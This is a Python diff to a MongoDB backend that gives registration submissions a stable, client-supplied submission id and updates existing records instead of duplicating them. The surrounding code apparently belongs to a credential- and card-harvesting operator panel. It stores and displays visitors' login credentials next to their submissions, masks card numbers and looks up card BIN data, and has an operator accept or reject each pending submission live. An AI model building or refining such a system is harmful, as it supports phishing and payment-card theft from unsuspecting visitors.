@@ -140,18 +140,36 @@ def masked_card_number(value: Any) -> str:
     return f'**** **** **** {digits[-4:]}' if len(digits) >= 4 else '****'
 
 
+def requested_submission_id(payload: dict[str, Any]) -> str:
+    return str(payload.get('submission_id') or payload.get('client_submission_id') or '').strip()[:120]
+
+
+def submission_query(submission_id: str) -> dict[str, Any]:
+    sid = str(submission_id or '').strip()
+    if not sid:
+        return {'_id': None}
+    query: dict[str, Any] = {'submission_id': sid}
+    try:
+        query = {'$or': [{'submission_id': sid}, {'_id': ObjectId(sid)}]}
+    except Exception:
+        pass
+    return query
+
+
 def create_registration_submission(
     payload: dict[str, Any],
     *,
     status: str = 'pending',
     decided_by: str = '',
 ) -> str:
-    """Persist a registration submission and return its id as string."""
+    """Persist or update a registration submission and return its stable submission id."""
     db = get_mongo_db()
     now = datetime.now(timezone.utc)
     normalized_status = status if status in {'pending', 'accepted', 'rejected', 'missed'} else 'pending'
     is_decided = normalized_status in {'accepted', 'rejected', 'missed'}
+    submission_id = requested_submission_id(payload) or str(ObjectId())
     doc = {
+        'submission_id': submission_id,
         'form_type': payload.get('form_type') or 'registration',
         'visitor_uid': (payload.get('visitor_uid') or '').strip(),
         'source_page': payload.get('source_page') or '',
@@ -180,8 +198,22 @@ def create_registration_submission(
         'decided_at': now if is_decided else None,
         'decided_by': decided_by if is_decided else '',
     }
-    res = db.registration_submissions.insert_one(doc)
-    return str(res.inserted_id)
+    existing = db.registration_submissions.find_one({'submission_id': submission_id}, {'status': 1})
+    if existing:
+        update_doc = {k: v for k, v in doc.items() if k not in {'submission_id', 'created_at'}}
+        if str(existing.get('status') or '') not in {'accepted', 'rejected', 'missed'}:
+            update_doc['status'] = normalized_status
+            update_doc['decided_at'] = now if is_decided else None
+            update_doc['decided_by'] = decided_by if is_decided else ''
+        else:
+            update_doc.pop('status', None)
+            update_doc.pop('decided_at', None)
+            update_doc.pop('decided_by', None)
+        db.registration_submissions.update_one({'submission_id': submission_id}, {'$set': update_doc})
+        return submission_id
+
+    db.registration_submissions.insert_one(doc)
+    return submission_id
 
 
 def latest_login_credentials(visitor_uid: str, *, before: datetime | None = None) -> dict[str, str]:
@@ -239,7 +271,7 @@ def submission_sort_value(row: dict[str, Any]) -> float:
 
 def serialize_registration_row(db, visitor_uid: str, r: dict[str, Any]) -> dict[str, Any]:
     r = ensure_payment_bin_info(r)
-    submission_id = str(r.get('_id') or r.get('submission_id') or '')
+    submission_id = str(r.get('submission_id') or r.get('_id') or '')
     created_at = r.get('created_at') or r.get('ts')
     login_values = (
         latest_login_credentials(visitor_uid, before=created_at if isinstance(created_at, datetime) else None)
@@ -346,18 +378,14 @@ def list_registration_submissions(visitor_uid: str, limit: int = 200) -> list[di
 
 
 def get_registration_submission_status(submission_id: str, visitor_uid: str) -> dict[str, Any] | None:
-    try:
-        oid = ObjectId(submission_id)
-    except Exception:
-        return None
     row = get_mongo_db().registration_submissions.find_one(
-        {'_id': oid, 'visitor_uid': (visitor_uid or '').strip()},
-        {'status': 1, 'visitor_uid': 1, 'form_type': 1, 'decided_at': 1},
+        {**submission_query(submission_id), 'visitor_uid': (visitor_uid or '').strip()},
+        {'status': 1, 'visitor_uid': 1, 'form_type': 1, 'decided_at': 1, 'submission_id': 1},
     )
     if not row:
         return None
     return {
-        'id': str(row.get('_id')),
+        'id': str(row.get('submission_id') or row.get('_id')),
         'visitor_uid': row.get('visitor_uid', ''),
         'form_type': row.get('form_type', 'registration'),
         'status': row.get('status', 'pending'),
@@ -366,14 +394,10 @@ def get_registration_submission_status(submission_id: str, visitor_uid: str) -> 
 
 
 def mark_registration_submission_missed(submission_id: str, visitor_uid: str) -> dict[str, Any] | None:
-    try:
-        oid = ObjectId(submission_id)
-    except Exception:
-        return None
     db = get_mongo_db()
     now = datetime.now(timezone.utc)
     row = db.registration_submissions.find_one_and_update(
-        {'_id': oid, 'visitor_uid': (visitor_uid or '').strip(), 'status': 'pending'},
+        {**submission_query(submission_id), 'visitor_uid': (visitor_uid or '').strip(), 'status': 'pending'},
         {'$set': {'status': 'missed', 'decided_at': now, 'decided_by': 'visitor_refresh'}},
         return_document=ReturnDocument.AFTER,
     )
@@ -384,7 +408,7 @@ def mark_registration_submission_missed(submission_id: str, visitor_uid: str) ->
         {'$set': {'status': 'missed', 'decided_at': now.isoformat(), 'decided_by': 'visitor_refresh'}},
     )
     return {
-        'id': str(row.get('_id')),
+        'id': str(row.get('submission_id') or row.get('_id')),
         'visitor_uid': row.get('visitor_uid', ''),
         'status': row.get('status', 'missed'),
         'decided_at': (row.get('decided_at').isoformat() if row.get('decided_at') else ''),
@@ -400,13 +424,9 @@ def decide_registration_submission(
 ) -> dict[str, Any] | None:
     if decision not in ('accepted', 'rejected'):
         return None
-    try:
-        oid = ObjectId(submission_id)
-    except Exception:
-        return None
     db = get_mongo_db()
     now = datetime.now(timezone.utc)
-    query: dict[str, Any] = {'_id': oid, 'status': 'pending'}
+    query: dict[str, Any] = {**submission_query(submission_id), 'status': 'pending'}
     if form_type:
         query['form_type'] = form_type
     row = db.registration_submissions.find_one_and_update(
@@ -421,7 +441,7 @@ def decide_registration_submission(
         {'$set': {'status': decision, 'decided_at': now.isoformat(), 'decided_by': decided_by or ''}},
     )
     return {
-        'id': str(row.get('_id')),
+        'id': str(row.get('submission_id') or row.get('_id')),
         'visitor_uid': row.get('visitor_uid', ''),
         'form_type': row.get('form_type', 'registration'),
         'status': row.get('status', ''),
